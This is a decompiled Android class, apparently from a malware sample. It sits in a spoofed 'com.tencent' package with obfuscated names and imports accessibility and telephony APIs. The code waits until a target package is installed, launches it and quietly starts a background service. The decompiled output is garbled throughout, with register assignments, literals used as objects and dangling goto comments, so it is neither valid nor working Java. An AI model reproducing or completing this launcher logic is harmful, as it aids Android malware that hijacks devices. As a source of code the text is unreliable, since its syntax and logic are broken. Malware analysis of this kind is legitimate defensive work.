package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: MainLauncherActivity_FI_tunesxconcerningn109_N
 * Original: Lcom/tencent/tunesxconcerningn109$FI_tunesxconcerningn109_N;
 */
class MainLauncherActivity_FI_tunesxconcerningn109_N extends AsyncTask {

    // === FIELDS ===
    private Context myctx;
    final MainLauncherActivity this$0;

    // === METHODS ===

    private void Constructor(MainLauncherActivity param0) {
        v0.this$0 = v1;
        // new AsyncTask()
        v1 = 0;
        v0.myctx = 0;
        return;
    }

     void Constructor(MainLauncherActivity param0, MainLauncherActivity$1 param1) {
        // new MainLauncherActivity$FI_tunesxconcerningn109_N(v1)
        return;
    }

    static Context access$102(MainLauncherActivity$FI_tunesxconcerningn109_N param0, Context param1) {
        v0.myctx = v1;
        return v1;
    }

    protected volatile Object doInBackground(Object[] param0) {
        v1 = (String[]) v1;
        v0.doInBackground(v1);
        return v1;
    }

    protected String doInBackground(String[] param0) {
        v6 = 1;
        v0 = 0;
        v1 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v2 = v1.toLowerCase();
        v2 = "null";
        v1 = v1.equals("null");
        if (v1 != null && v1 != 0) { // goto +98
        v1 = 0;
        v3 = 1000;
        "null".sleep(1000, v4);
        1000.getPackageManager();
        MainLauncherActivity.IP_tunesxconcerningn109_I("null", 1000);
        if ("null" == null || "null" == 0) { // goto +9
        v1 = Boolean.valueOf(0);
        MainLauncherActivity.Holdit = v1;
        // goto (branch)
        v2 = 25;
        if (v1 != 25) { // goto +7
        25.Check_tunesxconcerningn109_Bind();
        25.booleanValue();
        if (25 != null && 25 != 0) { // goto +-44
        // goto (branch)
        Boolean.valueOf(1);
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        return "S!S@S#S$%";
    }

    protected volatile void onPostExecute(Object param0) {
        v1 = (String) v1;
        v0.onPostExecute(v1);
        return;
    }

    protected void onPostExecute(String param0) {
        v4 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v0 = v3.this$0;
        v0.getPackageManager();
        v4 = MainLauncherActivity.IP_tunesxconcerningn109_I(v4, v0);
        if (v4 == null || v4 == 0) { // goto +42
        v4 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v0 = v4.toLowerCase();
        v0 = "null";
        v4 = v4.equals("null");
        if (v4 != null && v4 != 0) { // goto +28
        v4 = v3.this$0;
        v4.getApplicationContext();
        v0 = v4.getPackageManager();
        v0 = v4.getLaunchIntentForPackage("null");
        v0 = 268435456; // 0x10000000
        v4.addFlags("null");
        "null".startActivity(v4);
        v4 = MainBackgroundService.class;
        "null".getApplication();
        v4 = BackgroundServiceHelper.removedqtractort40(v4, "null");
        if (v4 == null || v4 == 0) { // goto +67
        v4 = v3.myctx;
        v1 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v2 = MainBackgroundService.class;
        // new Intent(v1, v2)
        v4.startService("null");
        // goto (branch)
        v4 = 1;
        v1 = Boolean.valueOf(1);
        v1 = 1.booleanValue();
        v1 = 0;
        if ("null" == null || "null" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("null" == null || "null" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("null" == null || "null" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.finish();
        return;
    }
}
